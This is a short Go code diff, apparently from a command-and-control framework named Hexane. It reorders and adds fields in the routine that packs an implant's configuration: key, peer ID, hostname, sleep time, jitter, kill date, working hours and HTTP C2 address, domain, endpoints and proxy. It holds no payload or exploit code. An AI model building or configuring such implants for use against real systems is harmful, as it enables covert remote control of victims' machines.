@@ -220,12 +220,20 @@ func (h *HexaneConfig) CreateBinaryPatch() ([]byte, error) {
 	stream := CreateStream()
 	implant := h.Implant
 
+	stream.PackBytes(h.Key)
+	stream.PackDword(1) // Root
+	stream.PackDword(1) // LE
+
+	for _, str := range h.UserConfig.Builder.LoadedModules {
+		stream.PackString(str)
+	}
 	stream.PackDword(h.PeerId)
 	stream.PackString(implant.Hostname)
+	stream.PackDword(implant.PeerId)
 	stream.PackDword(implant.Sleeptime)
 	stream.PackDword(implant.Jitter)
-	stream.PackDword64(implant.Killdate)
 	stream.PackInt32(implant.WorkingHours)
+	stream.PackDword64(implant.Killdate)
 
 	switch implant.ProfileTypeId {
 	case TRANSPORT_HTTP:
@@ -237,7 +245,6 @@ func (h *HexaneConfig) CreateBinaryPatch() ([]byte, error) {
 
 			stream.PackWString(httpConfig.Useragent)
 			stream.PackWString(httpConfig.Address)
-			stream.PackString(httpConfig.Domain)
 			stream.PackDword(uint32(httpConfig.Port))
 			stream.PackDword(uint32(len(httpConfig.Endpoints)))
 
@@ -247,6 +254,8 @@ func (h *HexaneConfig) CreateBinaryPatch() ([]byte, error) {
 			for _, uri := range httpConfig.Endpoints {
 				stream.PackWString(uri)
 			}
+
+			stream.PackString(httpConfig.Domain)
 
 			if httpConfig.Proxy != nil {
 				proxyUrl := fmt.Sprintf("%v://%v:%v", httpConfig.Proxy.Proto, httpConfig.Proxy.Address, httpConfig.Proxy.Port)
